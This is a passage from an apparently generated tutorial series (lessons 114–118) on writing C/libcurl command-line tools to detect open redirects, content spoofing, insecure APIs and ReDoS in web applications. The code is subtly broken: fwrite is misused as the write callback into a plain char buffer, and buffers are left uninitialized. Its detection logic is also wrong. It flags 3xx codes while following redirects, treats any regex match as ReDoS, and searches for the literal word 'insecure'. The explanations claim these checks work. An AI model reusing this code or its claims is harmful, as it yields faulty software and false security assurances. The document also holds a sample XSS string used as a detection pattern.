+- Integration with serialization libraries or frameworks (e.g., Java Object Serialization, PHP `unserialize()`) to automatically generate serialized payloads and test for vulnerabilities in specific deserialization implementations.
+- Implementation of additional checks and heuristics to analyze the server response and detect signs of insecure deserialization vulnerabilities more accurately.
+
+#### Conclusion:
+
+Building an insecure deserialization tool in C provides a framework for identifying and mitigating security risks related to deserialization vulnerabilities in web applications. By sending serialized payloads and analyzing the server response, developers and security professionals can proactively identify and address insecure deserialization vulnerabilities to improve the overall security posture of their applications.
+
+This concludes our one hundred fourteenth lesson on building an insecure deserialization tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 115: Building an Unvalidated Redirects and Forwards Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to detect unvalidated redirects and forwards vulnerabilities in web applications. Unvalidated redirects and forwards occur when a web application redirects or forwards users to another URL based on user-supplied input without proper validation, potentially leading to phishing attacks or unauthorized access to sensitive resources. Our tool will analyze URL redirections and forwards in target applications to identify potential vulnerabilities.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <curl/curl.h>
+
+#define MAX_URL_LENGTH 256
+
+// Function to perform HTTP GET request and retrieve server response
+int perform_http_get(const char *url) {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            fprintf(stderr, "Error: curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            curl_easy_cleanup(curl);
+            return -1;
+        }
+        long response_code;
+        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
+        if (response_code >= 300 && response_code < 400) {
+            printf("Unvalidated redirect or forward vulnerability found: %s\n", url);
+        }
+        curl_easy_cleanup(curl);
+    }
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <url>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    if (strlen(argv[1]) >= MAX_URL_LENGTH) {
+        fprintf(stderr, "Error: URL length exceeds maximum allowed length\n");
+        return EXIT_FAILURE;
+    }
+
+    curl_global_init(CURL_GLOBAL_ALL);
+
+    if (perform_http_get(argv[1]) < 0) {
+        return EXIT_FAILURE;
+    }
+
+    curl_global_cleanup();
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We use libcurl, a C library for transferring data with URLs, to perform HTTP GET requests and retrieve server responses.
+- The `perform_http_get` function initializes a libcurl easy handle, sets the URL, and performs the HTTP GET request. It checks the response code, and if it's in the 3xx range (indicating a redirection), it prints a message indicating that an unvalidated redirect or forward vulnerability was found.
+- The `main` function takes the target URL as a command-line argument and checks it for unvalidated redirects and forwards.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for analyzing HTML content to extract and follow redirects specified in `<meta>` tags or JavaScript code, allowing the tool to identify additional instances of unvalidated redirects and forwards.
+- Implementation of additional checks and heuristics to detect open redirect vulnerabilities, where attackers can specify arbitrary redirect URLs, and distinguish them from legitimate redirects used for authentication or session management purposes.
+- Integration with static analysis tools or web vulnerability scanners to automate the detection of unvalidated redirects and forwards vulnerabilities in large-scale web applications.
+
+#### Conclusion:
+
+Building an unvalidated redirects and forwards tool in C provides a framework for identifying and mitigating security risks related to improper URL redirections in web applications. By analyzing URL redirections and forwards and checking for proper validation, developers and security professionals can proactively identify and address vulnerabilities to improve the overall security posture of their applications.
+
+This concludes our one hundred fifteenth lesson on building an unvalidated redirects and forwards tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 116: Building a Content Spoofing Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to detect content spoofing vulnerabilities in web applications. Content spoofing occurs when an attacker manipulates the content displayed to users, often by injecting malicious scripts or misleading information, leading to phishing attacks or other security risks. Our tool will analyze web page content and identify potential instances of content spoofing.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <curl/curl.h>
+
+#define MAX_URL_LENGTH 256
+#define MAX_CONTENT_LENGTH 4096
+
+// Function to perform HTTP GET request and retrieve server response
+int perform_http_get(const char *url, char *content) {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, fwrite);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, content);
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            fprintf(stderr, "Error: curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            curl_easy_cleanup(curl);
+            return -1;
+        }
+        curl_easy_cleanup(curl);
+    }
+    return 0;
+}
+
+// Function to check for content spoofing vulnerabilities
+int check_content_spoofing(const char *content) {
+    // Add your content spoofing detection logic here
+    if (strstr(content, "<script>alert('XSS');</script>") != NULL) {
+        printf("Content spoofing vulnerability found!\n");
+        return 1;
+    }
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <url>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    if (strlen(argv[1]) >= MAX_URL_LENGTH) {
+        fprintf(stderr, "Error: URL length exceeds maximum allowed length\n");
+        return EXIT_FAILURE;
+    }
+
+    char *content = (char *)malloc(MAX_CONTENT_LENGTH * sizeof(char));
+    if (content == NULL) {
+        fprintf(stderr, "Error: Failed to allocate memory for content buffer\n");
+        return EXIT_FAILURE;
+    }
+
+    curl_global_init(CURL_GLOBAL_ALL);
+
+    if (perform_http_get(argv[1], content) < 0) {
+        free(content);
+        return EXIT_FAILURE;
+    }
+
+    if (check_content_spoofing(content) > 0) {
+        free(content);
+        return EXIT_FAILURE;
+    }
+
+    free(content);
+    curl_global_cleanup();
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We use libcurl, a C library for transferring data with URLs, to perform HTTP GET requests and retrieve server responses.
+- The `perform_http_get` function initializes a libcurl easy handle, sets the URL, and performs the HTTP GET request. It retrieves the response content and stores it in a buffer.
+- The `check_content_spoofing` function analyzes the retrieved content for signs of content spoofing vulnerabilities. In this example, we simply check for the presence of a known XSS payload, but you can expand this function with more sophisticated detection logic.
+- The `main` function takes the target URL as a command-line argument, retrieves the web page content, and checks it for content spoofing vulnerabilities.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Integration with static analysis tools or web vulnerability scanners to automatically detect content spoofing vulnerabilities in large-scale web applications and prioritize them based on severity and impact.
+- Implementation of additional detection techniques to identify different types of content spoofing attacks, such as header manipulation, form field tampering, or image and file manipulation.
+- Support for analyzing dynamic content generated by JavaScript or server-side scripts to detect content spoofing vulnerabilities introduced by client-side rendering or AJAX requests.
+
+#### Conclusion:
+
+Building a content spoofing tool in C provides a framework for identifying and mitigating security risks related to malicious content injection in web applications. By analyzing web page content and checking for signs of content spoofing, developers and security professionals can proactively identify and address vulnerabilities to improve the overall security posture of their applications.
+
+This concludes our one hundred sixteenth lesson on building a content spoofing tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 117: Building an Insecure APIs Detection Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to detect insecure APIs in web applications. Insecure APIs can expose sensitive data or allow unauthorized access to resources, leading to security breaches or data leaks. Our tool will analyze API endpoints and identify potential security vulnerabilities.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <curl/curl.h>
+
+#define MAX_URL_LENGTH 256
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to perform HTTP GET request and retrieve server response
+int perform_http_get(const char *url, char *response) {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, fwrite);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            fprintf(stderr, "Error: curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            curl_easy_cleanup(curl);
+            return -1;
+        }
+        curl_easy_cleanup(curl);
+    }
+    return 0;
+}
+
+// Function to check for insecure API endpoints
+int check_insecure_api(const char *response) {
+    // Add your insecure API detection logic here
+    if (strstr(response, "insecure") != NULL) {
+        printf("Insecure API endpoint found!\n");
+        return 1;
+    }
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <url>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    if (strlen(argv[1]) >= MAX_URL_LENGTH) {
+        fprintf(stderr, "Error: URL length exceeds maximum allowed length\n");
+        return EXIT_FAILURE;
+    }
+
+    char *response = (char *)malloc(MAX_RESPONSE_SIZE * sizeof(char));
+    if (response == NULL) {
+        fprintf(stderr, "Error: Failed to allocate memory for response buffer\n");
+        return EXIT_FAILURE;
+    }
+
+    curl_global_init(CURL_GLOBAL_ALL);
+
+    if (perform_http_get(argv[1], response) < 0) {
+        free(response);
+        return EXIT_FAILURE;
+    }
+
+    if (check_insecure_api(response) > 0) {
+        free(response);
+        return EXIT_FAILURE;
+    }
+
+    free(response);
+    curl_global_cleanup();
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We use libcurl, a C library for transferring data with URLs, to perform HTTP GET requests and retrieve server responses.
+- The `perform_http_get` function initializes a libcurl easy handle, sets the URL, and performs the HTTP GET request. It retrieves the response content and stores it in a buffer.
+- The `check_insecure_api` function analyzes the retrieved response for signs of insecure API endpoints. In this example, we simply search for the term "insecure" in the response, but you can expand this function with more sophisticated detection logic.
+- The `main` function takes the target URL as a command-line argument, retrieves the API response, and checks it for insecure API endpoints.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Integration with API documentation or specification files (e.g., OpenAPI, Swagger) to automatically identify and test API endpoints defined in the documentation and ensure comprehensive coverage during security testing.
+- Implementation of additional detection techniques to identify common security vulnerabilities in API endpoints, such as missing authentication, inadequate authorization, or insufficient input validation.
+- Support for analyzing dynamic API responses generated by JavaScript or server-side scripts to detect security vulnerabilities introduced by client-side rendering or AJAX requests.
+
+#### Conclusion:
+
+Building an insecure APIs detection tool in C provides a framework for identifying and mitigating security risks related to insecure API endpoints in web applications. By analyzing API responses and checking for signs of insecurity, developers and security professionals can proactively identify and address vulnerabilities to improve the overall security posture of their applications.
+
+This concludes our one hundred seventeenth lesson on building an insecure APIs detection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 118: Building a Server-Side ReDoS Detection Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to detect Server-Side Regular Expression Denial of Service (ReDoS) vulnerabilities in web applications. Server-Side ReDoS vulnerabilities occur when a regular expression used in server-side code can be exploited to cause a denial of service by entering a specially crafted input that triggers excessive backtracking. Our tool will analyze server responses and identify potential instances of ReDoS vulnerabilities.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <curl/curl.h>
+#include <pcre.h>
+
+#define MAX_URL_LENGTH 256
+#define MAX_RESPONSE_SIZE 4096
+#define MAX_PATTERN_LENGTH 256
+
+// Function to perform HTTP GET request and retrieve server response
+int perform_http_get(const char *url, char *response) {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, fwrite);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            fprintf(stderr, "Error: curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            curl_easy_cleanup(curl);
+            return -1;
+        }
+        curl_easy_cleanup(curl);
+    }
+    return 0;
+}
+
+// Function to check for Server-Side ReDoS vulnerabilities
+int check_server_side_redos(const char *response, const char *pattern) {
+    pcre *re;
+    const char *error;
+    int erroffset;
+    int rc;
+
+    re = pcre_compile(pattern, 0, &error, &erroffset, NULL);
+    if (re == NULL) {
+        fprintf(stderr, "Error: pcre_compile() failed: %s (offset: %d)\n", error, erroffset);
+        return -1;
+    }
+
+    // Add your Server-Side ReDoS detection logic here
+    int ovector[30];
+    rc = pcre_exec(re, NULL, response, strlen(response), 0, 0, ovector, 30);
+    if (rc < 0) {
+        if (rc == PCRE_ERROR_NOMATCH) {
+            pcre_free(re);
+            return 0; // No ReDoS vulnerability found
+        } else {
+            fprintf(stderr, "Error: pcre_exec() failed with error code %d\n", rc);
+            pcre_free(re);
+            return -1;
+        }
+    } else {
+        printf("Server-Side ReDoS vulnerability found!\n");
+        pcre_free(re);
+        return 1;
+    }
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 3) {
+        fprintf(stderr, "Usage: %s <url> <pattern>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    if (strlen(argv[1]) >= MAX_URL_LENGTH) {
+        fprintf(stderr, "Error: URL length exceeds maximum allowed length\n");
+        return EXIT_FAILURE;
+    }
+
+    if (strlen(argv[2]) >= MAX_PATTERN_LENGTH) {
+        fprintf(stderr, "Error: Pattern length exceeds maximum allowed length\n");
+        return EXIT_FAILURE;
+    }
+
+    char *response = (char *)malloc(MAX_RESPONSE_SIZE * sizeof(char));
+    if (response == NULL) {
+        fprintf(stderr, "Error: Failed to allocate memory for response buffer\n");
+        return EXIT_FAILURE;
+    }
+
+    curl_global_init(CURL_GLOBAL_ALL);
+
+    if (perform_http_get(argv[1], response) < 0) {
+        free(response);
+        return EXIT_FAILURE;
+    }
+
+    if (check_server_side_redos(response, argv[2]) > 0) {
+        free(response);
+        return EXIT_FAILURE;
+    }
+
+    free(response);
+    curl_global_cleanup();
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We use libcurl, a C library for transferring data with URLs, to perform HTTP GET requests and retrieve server responses.
+- We use the PCRE (Perl Compatible Regular Expressions) library to compile and execute regular expressions.
+- The `perform_http_get` function initializes a libcurl easy handle, sets the URL, and performs the HTTP GET request. It retrieves the response content and stores it in a buffer.
+- The `check_server_side_redos` function compiles the provided regular expression pattern and executes it against the server response using PCRE. If excessive backtracking occurs, indicating a potential ReDoS vulnerability, the function returns a positive result.
+- The `main` function takes the target URL and regular expression pattern as command-line arguments, retrieves the server response, and checks it for Server-Side ReDoS vulnerabilities.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for analyzing multiple regular expression patterns and identifying potential ReDoS vulnerabilities across different parts of the server response.
+- Integration with static analysis tools or web vulnerability scanners to automatically detect Server-Side ReDoS vulnerabilities in large-scale web applications and prioritize them based on severity and impact.
+- Implementation of additional detection techniques to identify common ReDoS attack vectors, such as greedy quantifiers, nested repetitions, or inefficient backtracking patterns.
+
+#### Conclusion:
+
+Building a Server-Side ReDoS detection tool in C provides a framework for identifying and mitig
+
+ating security risks related to regular expression denial of service vulnerabilities in web applications. By analyzing server responses and checking for signs of excessive backtracking, developers and security professionals can proactively identify and address vulnerabilities to improve the overall security posture of their applications.
+
+This concludes our one hundred eighteenth lesson on building a Server-Side ReDoS detection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
